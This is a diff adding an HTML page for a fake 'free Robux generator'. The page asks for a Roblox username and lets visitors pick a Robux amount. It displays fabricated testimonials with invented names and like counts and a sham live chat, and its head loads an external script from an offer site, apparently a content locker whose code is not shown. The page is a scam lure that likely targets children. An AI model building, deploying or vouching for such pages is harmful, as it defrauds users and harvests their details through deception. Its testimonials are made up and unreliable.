@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <script src="https://binfileoffer.com/script_include.php?id=954365"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" type="image/png" href="robux.png">
+    <link rel="stylesheet" href="style.css">
+    <script src="https://kit.fontawesome.com/754e457f9e.js"></script>
+    <script type="text/javascript" src="main.js" defer></script>
+    <title>Roblox Robux</title>
+</head>
+
+<body>
+    <h1>Claim your FREE Robux NOW!</h1>
+    <img id="robux" src="robux.png" width=250>
+    <div class="wrapper">
+        <div class="form">
+            <h2>Free Robux</h2>
+            <!-- <div style='display:flex;justify-content:center;align-items:center;flex-direction:row;'> -->
+            <!-- <i class="fas fa-user-plus"></i> -->
+            <input type="text" id="username" name="" value="" autocomplete="off" placeholder="Your Username..." spellcheck="false">
+            <!-- </div> -->
+            <div class="container">
+
+                <div class="select-box">
+                    <div class="options-container">
+                        <div class="option">
+                            <input type="radio" class="radio" id="automobiles" name="category" />
+                            <label for="automobiles">5000 Robux</label>
+                        </div>
+
+                        <div class="option">
+                            <input type="radio" class="radio" id="film" name="category" />
+                            <label for="film">10000 Robux</label>
+                        </div>
+
+                        <div class="option">
+                            <input type="radio" class="radio" id="science" name="category" />
+                            <label for="science">15000 Robux</label>
+                        </div>
+
+                        <div class="option">
+                            <input type="radio" class="radio" id="art" name="category" />
+                            <label for="art">20000 Robux</label>
+                        </div>
+                    </div>
+
+                    <div class="selected">
+                        Select Robux Amount
+                    </div>
+                </div>
+            </div>
+            <input type="submit" name="" value="Get Robux" onclick="appear()">
+
+        </div>
+    </div>
+    <section>
+
+
+        <div id="facebook">
+
+
+            <div style="display:flex; justify-content:space-between; align-items:center;width:90%;flex-direction:row; margin-top:15px;margin-left:15px;">
+                <h5>Comments of users</h5>
+                <h5>47 of 133</h5>
+            </div>
+
+
+
+            <div style="display:flex; justify-content:center; align-items:center;width:100%;flex-direction:row;">
+                <hr>
+                </hr>
+            </div>
+            <div style="margin-left:15px;display:flex;justify-content:flex-start;flex-direction:row;">
+                <img src="face3.jpg" width=90 height=70 style="border-radius:50%;">
+                <div style="flex-direction:column; margin-left:15px;">
+                    <h5>Bharat Anevarup</h5>
+                    <span style='font-size:12px;'>At first I didn't think this was real, but I changed my mind after I tried!</span>
+                </div>
+            </div>
+
+            <h6 style='margin-left:15px;'>Like • Comment <img src="like1.png" width=13 height=13 style='position:relative;'> 34 • 3 hours ago</h6>
+            <div style="display:flex; justify-content:center; align-items:center;width:100%;flex-direction:row;">
+                <hr>
+                </hr>
+            </div>
+            <div style="margin-left:15px;display:flex;justify-content:flex-start;flex-direction:row;">
+                <img src="face1.jpg" style="border-radius:50%;" width=70 height=70>
+                <div style="flex-direction:column; margin-left:15px;">
+                    <h5>Don Tex</h5>
+                    <span style='font-size:12px;'>I claimed 15000 Robux just in one click, thank you guys!</span>
+                </div>
+            </div>
+
+            <h6 style='margin-left:15px;'>Like • Comment <img src="like1.png" width=13 height=13 style='position:relative;'> 45 • 14 hours ago</h6>
+            <div style="display:flex; justify-content:center; align-items:center;width:100%;flex-direction:row;">
+                <hr>
+                </hr>
+            </div>
+            <div style="margin-left:15px;display:flex;justify-content:flex-start;flex-direction:row;">
+                <img src="face2.jpg" width=60 height=70 style="border-radius:50%;">
+                <div style="flex-direction:column; margin-left:15px;">
+                    <h5>Elizabeth Rebecca</h5>
+                    <span style='font-size:12px;'>OK IT WORKS LOOOOOOL. THANKS! I'll share this with my friends right nowwww. Highly recommend!</span>
+                </div>
+            </div>
+
+            <h6 style='margin-left:15px;'>Like • Comment <img src="like1.png" width=13 height=13 style='position:relative;'> 77 • 2 days ago</h6>
+            <div style="display:flex; justify-content:center; align-items:center;width:100%;flex-direction:row;">
+                <hr>
+                </hr>
+            </div>
+            <div style="margin-left:15px;display:flex;justify-content:flex-start;flex-direction:row;">
+                <img src="face4.jpg" width=60 height=70 style="border-radius:50%;">
+                <div style="flex-direction:column; margin-left:15px;">
+                    <h5>Dorian Gurzau</h5>
+                    <span style='font-size:12px;'>Just WOW!! This really works I'm just shocked!</span>
+                </div>
+            </div>
+
+            <h6 style='margin-left:15px;'>Like • Comment <img src="like1.png" width=13 height=13 style='position:relative;'> 89 • 3 days ago</h6>
+            <div style="display:flex; justify-content:center; align-items:center;width:100%;flex-direction:row;">
+                <hr>
+                </hr>
+            </div>
+
+
+
+
+        </div>
+
+
+        <div id="livechat">
+            <h4 style='text-align:center; margin-top:15px;'>Live Chat</h4>
+            <div style="display:flex; justify-content:center; align-items:center;width:100%;flex-direction:row;">
+                <hr>
+                </hr>
+            </div>
+            <div id="chat" style='margin-left:15px; margin-right:15px; height:400px; overflow:auto;'>
+
+            </div>
+            <div style='display:flex; flex-direction:row;align-items:center;justify-content:space-between; margin-top:15px; margin-left:15px; margin-right:15px;'>
+                <input type="text" name="" value="" placeholder="Type your message.." spellcheck="false">
+                <input type="submit" name="" value="Send" style='margin-top:0;'>
+            </div>
+        </div>
+
+
+    </section>
+
+
+    <footer>
+        &copy; 2021 All Rights Reserved. Free Robux Generator Website.
+    </footer>
+
+</body>
+
+</html>
